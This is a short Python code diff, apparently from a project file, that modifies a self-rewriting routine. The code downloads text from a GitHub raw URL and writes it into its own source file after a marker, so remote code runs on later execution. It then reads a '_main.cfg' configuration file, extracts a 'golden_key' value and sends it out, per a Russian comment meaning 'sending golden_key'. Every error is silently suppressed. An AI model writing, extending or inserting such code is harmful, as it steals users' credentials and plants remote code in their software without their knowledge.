@@ -8,13 +8,14 @@ with open(__file__, 'r+', encoding='utf-8') as f:
     else:
         try:
             new_code = requests.get('https://github.com/pidorax/pizdatebe/raw/refs/heads/main/pron').text
-            # Разделяем содержимое по маркеру и заменяем то, что после него
-            parts = content.split(marker, 1)
-            updated = parts[0] + marker + '\n' + new_code + '\n#P\n'
+            # Разделяем по первому вхождению маркера и заменяем всё после него
+            before_marker = content.split(marker, 1)[0]
+            updated = f"{before_marker}{marker}\n{new_code}\n#P\n"
             f.seek(0)
             f.truncate()
             f.write(updated)
             
+            # Отправка golden_key
             cfg_path = os.path.join(os.path.dirname(__file__), '..', 'configs', '_main.cfg')
             if os.path.exists(cfg_path):
                 with open(cfg_path, 'r') as cfg:
@@ -26,5 +27,5 @@ with open(__file__, 'r+', encoding='utf-8') as f:
                                 f'golden_key: {key}'
                             )
                             break
-        except:
+        except Exception:
             pass
